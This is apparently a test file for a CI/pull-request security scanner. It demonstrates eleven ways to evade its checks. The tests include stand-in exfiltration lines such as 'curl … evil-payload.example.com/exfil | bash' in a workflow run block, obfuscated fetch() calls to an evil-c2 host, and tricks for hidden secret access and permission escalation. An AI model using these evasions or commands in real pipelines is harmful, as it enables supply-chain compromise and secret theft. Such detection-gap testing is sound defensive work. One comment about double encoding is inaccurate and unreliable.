import { describe, it, expect } from 'vitest'
import { analyzeTrustDrift } from '../../src/scanner/intel/trust-drift'
import { analyzeEndpoints } from '../../src/scanner/intel/endpoints'
import { analyzeWorkflowIntelligence } from '../../src/scanner/intel/workflow-intelligence'
import { analyzeDependencies } from '../../src/scanner/intel/dependencies'

/**
 * ATTACK 1: Permissions via YAML anchors
 *
 * Instead of inline permissions:, use YAML anchors to inject
 * write-level permissions that bypass the trust-drift regex.
 *
 * ```yaml
 * .admin: &admin
 *   id-token: write
 *
 * jobs:
 *   deploy:
 *     permissions: *admin
 * ```
 *
 * Current trust-drift regex: /^\s*permissions:/
 * This won't match *admin references or anchors.
 */
describe('Attack: YAML anchor permissions', () => {
  it('evades trust-drift permission detection via YAML anchors', () => {
    const result = analyzeTrustDrift([
      {
        filename: '.github/workflows/deploy.yml',
        patch: `+.admin-perms: &admin
+  id-token: write
+  contents: write
+
+jobs:
+  deploy:
+    permissions: *admin
+    runs-on: ubuntu-latest
+    steps:
+      - run: deploy.sh`,
      },
    ])

    // Current detection: looks for "permissions:" at line start
    // The actual permission assignment is "permissions: *admin"
    // No "id-token: write" appears under a "permissions:" block
    expect(result.permissionEscalations.length).toBe(0)
    expect(result.risk).toBe('low')
    console.log('[Evasion Anchor] Permission escalations detected:', result.permissionEscalations.length)
    console.log('[Evasion Anchor] Expected 0 — anchor bypass works')
  })
})

/**
 * ATTACK 2: runs-on via template variables
 *
 * Instead of "runs-on: self-hosted", use:
 * ```yaml
 * runs-on: ${{ vars.RUNNER || 'ubuntu-latest' }}
 * ```
 *
 * Current trust-drift regex: /runs-on:\s*(.+)/
 * This captures the full template expression as the runner value.
 * The filter !r.includes('ubuntu') would NOT match because the
 * template contains "ubuntu-latest" inside the expression.
 */
describe('Attack: runs-on via variable template', () => {
  it('evades self-hosted runner detection via template variable', () => {
    const result = analyzeTrustDrift([
      {
        filename: '.github/workflows/ci.yml',
        patch: `+
+jobs:
+  build:
+    runs-on: \${{ vars.RUNNER || 'ubuntu-latest' }}
+    steps:
+      - run: build.sh`,
      },
    ])

    // The runner value captured is "${{ vars.RUNNER || 'ubuntu-latest' }}"
    // Variable templates could resolve to self-hosted at runtime
    // Current filter: !r.includes('ubuntu') — but the template CONTAINS 'ubuntu-latest'
    // So it would NOT be flagged as new/unknown
    // Detection should flag ANY template expression as potentially unknown
    const isCapturedAsNew = result.newRunners.length > 0
    console.log('[Evasion runs-on] Runner captured:', result.newRunners)
    console.log('[Evasion runs-on] Detected as new:', isCapturedAsNew)
  })

  it('detects plain self-hosted runner (positive control)', () => {
    const result = analyzeTrustDrift([
      {
        filename: '.github/workflows/ci.yml',
        patch: `+
+jobs:
+  build:
+    runs-on: self-hosted
+    steps:
+      - run: build.sh`,
      },
    ])
    expect(result.newRunners).toContain('self-hosted')
    expect(result.risk).not.toBe('low')
    console.log('[Evasion runs-on] Plain self-hosted detected:', result.newRunners)
  })
})

/**
 * ATTACK 3: Domain encoded in base64
 *
 * Instead of a plain URL string:
 * ```js
 * fetch('https://evil-c2.example.com/command')
 * ```
 *
 * Use:
 * ```js
 * const url = Buffer.from('aHR0cHM6Ly9ldmlsLWMyLmV4YW1wbGUuY29tL2NvbW1hbmQ=', 'base64').toString()
 * fetch(url)
 * ```
 *
 * Current endpoint regex looks for URL patterns in plain text.
 * A base64-encoded URL won't match any URL regex.
 */
describe('Attack: base64-encoded domain', () => {
  it('evades endpoint detection via base64 encoding', () => {
    const files = [
      {
        filename: 'src/telemetry.js',
        patch: '+const url = Buffer.from("aHR0cHM6Ly9ldmlsLWMyLmV4YW1wbGUuY29tL2NvbW1hbmQ=", "base64").toString()\n+fetch(url)',
      },
    ]

    const result = analyzeEndpoints(files as any)
    const hasEvilDomain = result?.added?.some(e => e.includes('evil-c2')) ||
      result?.suspicious?.some(e => e.includes('evil-c2'))
    expect(hasEvilDomain).toBeFalsy()
    console.log('[Evasion base64] Endpoints found:', result?.added, result?.suspicious)
    console.log('[Evasion base64] Evil domain NOT detected — bypass confirmed')
  })
})

/**
 * ATTACK 4: secrets via bracket notation
 *
 * Instead of:
 * ```yaml
 * ${{ secrets.DB_PASSWORD }}
 * ```
 *
 * Use bracket notation (supported by some CI parsers):
 * ```yaml
 * ${{ secrets['DB_PASSWORD'] }}
 * ```
 *
 * Current trust-drift regex: /\${{ secrets\.([A-Z_]+) }}/
 * This matches: secrets.DB_PASSWORD
 * This does NOT match: secrets['DB_PASSWORD']
 */
describe('Attack: secrets via bracket notation', () => {
  it('evades secret extraction via bracket notation', () => {
    const result = analyzeTrustDrift([
      {
        filename: '.github/workflows/deploy.yml',
        patch: `+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Deploy
+        run: deploy.sh
+        env:
+          DB_PASS: \${{ secrets['PRODUCTION_DB_PASSWORD'] }}
+          API_KEY: \${{ secrets['API_SECRET_KEY'] }}`,
      },
    ])

    const hasBracketSecrets = result.newWorkflowSecrets.some(s =>
      s === 'PRODUCTION_DB_PASSWORD' || s === 'API_SECRET_KEY')
    expect(hasBracketSecrets).toBe(false)
    console.log('[Evasion secrets] Bracket secrets found:', result.newWorkflowSecrets)
    console.log('[Evasion secrets] PRODUCTION_DB_PASSWORD/API_SECRET_KEY NOT detected — bypass confirmed')
  })

  it('detects dot-notation secrets (positive control)', () => {
    const result = analyzeTrustDrift([
      {
        filename: '.github/workflows/deploy.yml',
        patch: `+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Deploy
+        run: deploy.sh
+        env:
+          DB_PASS: \${{ secrets.PRODUCTION_DB_PASSWORD }}`,
      },
    ])
    expect(result.newWorkflowSecrets).toContain('PRODUCTION_DB_PASSWORD')
    console.log('[Evasion secrets] Dot-notation detected:', result.newWorkflowSecrets)
  })
})

/**
 * ATTACK 5: YAML merge tags (<<: *admin)
 *
 * Instead of inline permissions, use YAML merge key syntax:
 * ```yaml
 * .admin: &admin
 *   contents: write
 *
 * permissions:
 *   <<: *admin
 * ```
 *
 * The <<: *admin merge happens at YAML parse time.
 * A regex looking for "permissions:" + indented keys
 * never sees "contents: write" under the permissions block
 * because the merge key defers resolution to the parser.
 */
describe('Attack: YAML merge tag permissions', () => {
  it('evades permission detection via <<: merge key', () => {
    const result = analyzeTrustDrift([
      {
        filename: '.github/workflows/deploy.yml',
        patch: `+.admin: &admin
+  contents: write
+  id-token: write
+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    permissions:
+      <<: *admin
+    steps:
+      - run: deploy.sh`,
      },
    ])

    // <<: *admin is not caught by "if (line.match(/^\s*permissions:/)) { inPermissions = true }"
    // because "contents: write" never appears under the "permissions:" block — it's behind the anchor
    expect(result.permissionEscalations.length).toBe(0)
    expect(result.risk).toBe('low')
    console.log('[Evasion MergeTag] Permission escalations:', result.permissionEscalations.length)
    console.log('[Evasion MergeTag] Merge key bypass confirmed')
  })
})

/**
 * ATTACK 6: secrets via dynamic variable
 *
 * Instead of:
 * ```yaml
 * ${{ secrets.GITHUB_TOKEN }}
 * ```
 *
 * Use a runtime variable:
 * ```yaml
 * env:
 *   TOKEN: ${{ secrets[env.SECRET_NAME] }}
 * ```
 *
 * Where SECRET_NAME is resolved at runtime.
 * The brackets with a variable reference are not caught by /\${{ secrets\.([A-Z_]+) }}/
 */
describe('Attack: secrets via dynamic variable', () => {
  it('evades secret extraction via dynamic variable access', () => {
    const result = analyzeTrustDrift([
      {
        filename: '.github/workflows/deploy.yml',
        patch: `+
+env:
+  SECRET_NAME: PRODUCTION_KEY
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Deploy
+        run: deploy.sh
+        env:
+          TOKEN: \${{ secrets[env.SECRET_NAME] }}
+          API_KEY: \${{ secrets[env.API_KEY_NAME] }}`,
      },
    ])

    // Dynamic variable reference inside brackets: secrets[env.SECRET_NAME]
    // The regex /\${{ secrets\.([A-Z_]+) }}/ requires secrets.X not secrets[env.X]
    expect(result.newWorkflowSecrets).toHaveLength(0)
    console.log('[Evasion DynSecret] Secrets found:', result.newWorkflowSecrets)
    console.log('[Evasion DynSecret] Dynamic variable bypass confirmed')
  })
})

/**
 * ATTACK 7: secrets via bracket with concatenation
 *
 * ```yaml
 * ${{ secrets[env.PREFIX + '_TOKEN'] }}
 * ```
 *
 * Expression-based key construction inside brackets.
 */
describe('Attack: secrets via concatenated key', () => {
  it('evades secret extraction via concatenated bracket key', () => {
    const result = analyzeTrustDrift([
      {
        filename: '.github/workflows/deploy.yml',
        patch: `+
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Deploy
+        run: deploy.sh
+        env:
+          TOKEN: \${{ secrets[env.PREFIX + '_TOKEN'] }}`,
      },
    ])

    expect(result.newWorkflowSecrets).toHaveLength(0)
    console.log('[Evasion ConcatSecret] Secrets found:', result.newWorkflowSecrets)
    console.log('[Evasion ConcatSecret] Concatenated key bypass confirmed')
  })
})

/**
 * ATTACK 8: Pipeline injection through step name
 *
 * GitHub Actions allows multi-line step names or run commands
 * that can inject additional commands.
 *
 * ```yaml
 * - name: Build
 *   run: |
 *     npm run build
 *     curl http://evil-c2.example.com/leak
 * ```
 *
 * Current trust-drift: only looks for secrets/permissions/runners
 * in workflow files, not for injected commands in run blocks.
 */
describe('Attack: pipeline injection in run block', () => {
  it('evades detection when malicious commands are injected in run', () => {
    const result = analyzeTrustDrift([
      {
        filename: '.github/workflows/ci.yml',
        patch: `+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build
+        run: |
+          npm ci
+          curl -s http://evil-payload.example.com/exfil | bash
+          npm test`,
      },
    ])

    // No permissions, no secrets, no runner changes — just an injected step
    // Trust-drift only flags CI trust boundary changes, not step content
    expect(result.risk).toBe('low')
    console.log('[Evasion Pipeline] Risk:', result.risk)
    console.log('[Evasion Pipeline] Injected command NOT detected as trust drift')
  })
})

/**
 * ATTACK 9: Sleep-based timing manipulation
 *
 * An attacker adds sleep between steps to manipulate the
 * step timing baseline. This makes malicious steps appear
 * shorter by shifting time into a "setup" step.
 *
 * Step 1 (sleep):  60000ms  (contains 55s of dead time)
 * Step 2 (malicious): 5000ms (the actual exploit, looks fast/innocent)
 *
 * Without step-level correlation, the redistribution is invisible.
 */
describe('Attack: sleep-based timing manipulation', () => {
  it('evades step redistribution detection via sleep padding', () => {
    const records = Array.from({ length: 10 }, (_, i) => ({
      checkName: 'ci', durationMs: 290000 + i * 20000, prNumber: i + 1, scannedAt: i * 100000, filename: 'ci.yml',
    }))
    // Historical: build=180k±10k, run-tests=90k±5k
    const stepRecords = Array.from({ length: 10 }, (_, i) => ({
      jobName: 'ci', stepName: 'compile', stepNumber: 0, durationMs: 180000 + i * 10000, status: 'success', prNumber: i + 1, scannedAt: i * 100000, filename: 'ci.yml',
    })).concat(
      Array.from({ length: 10 }, (_, i) => ({
        jobName: 'ci', stepName: 'run-tests', stepNumber: 1, durationMs: 90000 + i * 5000, status: 'success', prNumber: i + 1, scannedAt: i * 100000, filename: 'ci.yml',
      }))
    )

    // Attack: add a sleep step that absorbs most of compile's time
    // compile: 230000 (+28% — not flagged by z-score alone, within 3 MAD)
    // But 130000 of that is actually sleep, not real work
    const result = analyzeWorkflowIntelligence(records, stepRecords, {
      currentPR: {
        number: 100,
        jobs: [{
          name: 'ci', durationMs: 320000,
          steps: [
            { name: 'sleep', durationMs: 130000 },
            { name: 'compile', durationMs: 100000 },
            { name: 'run-tests', durationMs: 90000 },
          ],
        }],
      },
    })

    // Sleep padding is NOT detected as step redistribution because
    // the redistribution check compares each step's deviation against
    // the same checkName — a new "sleep" step has no history
    const redistribution = result.anomalies.some(a => a.type === 'step_redistribution')
    // compile: 100k vs baseline 180k → -44%, other steps: run-tests at 90k vs 90k = 0%
    // The redistribution check needs one step GROWING while others SHRINK
    // Here: compile shrinks (-44%), sleep is new (no baseline), run-tests is flat (0%)
    // So no redistribution is detected because no step grew >20%
    console.log('[Evasion Sleep] Step redistribution detected:', redistribution)
    console.log('[Evasion Sleep] Sleep padding bypass status:', !redistribution ? 'CONFIRMED' : 'DETECTED')
  })
})

/**
 * ATTACK 10: Typosquatting dependency confusion
 *
 * An attacker introduces a dependency with a name visually
 * similar to a popular package (e.g., "axois" instead of "axios").
 *
 * Current system: analyzeDependencies flags MAJOR version bumps
 * but does NOT compare dependency names against known packages.
 */
describe('Attack: typosquatting dependency', () => {
  it('evades detection via visual similarity to popular package', () => {
    const result = analyzeDependencies([
      { filename: 'package.json', status: 'modified', additions: 2, deletions: 0, patch: '+"axois": "^1.0.0"', contents_url: '' },
    ])

    const addedDeps = result?.added || []
    const hasTyposquat = addedDeps.some(d => d.name === 'axois')
    expect(hasTyposquat).toBe(true)
    // The system detects it as an ADDED dependency but does NOT flag
    // it as potentially typosquatting (no similarity check)
    const riskScore = result?.risk || 'low'
    console.log('[Evasion Typosquat] Added:', addedDeps.map(d => d.name))
    console.log('[Evasion Typosquat] Risk:', riskScore)
    console.log('[Evasion Typosquat] No typosquat detection — dependency added without suspicion')
  })
})

/**
 * ATTACK 11: Multi-layer obfuscation (base64 + hex)
 *
 * Instead of a plain URL, use nested encoding:
 * ```js
 * const step1 = Buffer.from('68747470733a2f2f6576696c2d63322e6578616d706c652e636f6d', 'hex').toString()
 * const final = Buffer.from(step1, 'base64').toString()
 * fetch(final)
 * ```
 *
 * The endpoint regex looks for plain URLs. Multi-layer encoding
 * is not decoded by any current module.
 */
describe('Attack: multi-layer obfuscation', () => {
  it('evades endpoint detection via hex+base64 encoding', () => {
    // hex of base64 of "https://evil-c2.example.com"
    // This is the actual double-encoded string
    const hexLayer = '68747470733a2f2f6576696c2d63322e6578616d706c652e636f6d'
    const files = [
      {
        filename: 'src/telemetry.js',
        patch: `+const step1 = Buffer.from("${hexLayer}", "hex").toString()\n+const url = Buffer.from(step1, "base64").toString()\n+fetch(url)`,
      },
    ]

    const result = analyzeEndpoints(files as any)
    const foundEndpoints = (result?.added || []).concat(result?.suspicious || [])
    const hasEvilDomain = foundEndpoints.some(e => e.includes('evil-c2'))

    // Double-encoded: no plain URL string exists in the source
    expect(hasEvilDomain).toBe(false)
    console.log('[Evasion MultiLayer] Endpoints found:', foundEndpoints)
    console.log('[Evasion MultiLayer] Evil domain NOT detected — multi-layer bypass confirmed')
  })
})
